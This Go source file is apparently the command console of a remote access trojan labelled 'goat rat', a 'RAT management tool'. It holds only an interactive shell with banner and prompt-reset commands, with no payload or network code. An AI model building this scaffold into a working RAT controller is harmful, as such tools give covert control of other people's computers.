package server

import (
	"fmt"
	"os"
	"os/exec"

	"github.com/desertbit/grumble"
	"github.com/fatih/color"
)

var App = grumble.New(&grumble.Config{
	Name:                  "goat rat",
	Description:           "This is a rat management tool",
	Prompt:                "goatrat > ",
	PromptColor:           color.New(color.FgRed, color.Bold),
	HelpHeadlineColor:     color.New(color.FgGreen),
	HelpHeadlineUnderline: true,
	HelpSubCommands:       true,
})

func init() {
	App.SetPrintASCIILogo(func(a *grumble.App) {
		cmd := exec.Command("clear")
		cmd.Stdout = os.Stdout
		cmd.Run()
		showBanner()
	})
	App.AddCommand(&grumble.Command{
		Name: "banner",
		Help: "show banner",
		Run: func(c *grumble.Context) error {
			showBanner()
			return nil
		},
	})
	App.AddCommand(&grumble.Command{
		Name: "back",
		Help: "reset to default prompt",
		Run: func(c *grumble.Context) error {
			c.App.SetDefaultPrompt()
			return nil
		},
	})
}

func showBanner() {
	banner := "\n" +
		"	██╗    ██╗ ██████╗ ██████╗     ██████╗  █████╗ ████████╗\n" +
		"	██║    ██║██╔════╝ ██╔══██╗    ██╔══██╗██╔══██╗╚══██╔══╝\n" +
		"	██║ █╗ ██║██║  ███╗██████╔╝    ██████╔╝███████║   ██║   \n" +
		"	██║███╗██║██║   ██║██╔═══╝     ██╔══██╗██╔══██║   ██║   \n" +
		"	╚███╔███╔╝╚██████╔╝██║         ██║  ██║██║  ██║   ██║   \n" +
		"	 ╚══╝╚══╝  ╚═════╝ ╚═╝         ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   \n" +
		"[+] RAT manage tools\t version:0.1\n\n"
	fmt.Printf("\x1b[32;1m%s\x1b[0m", banner)
}
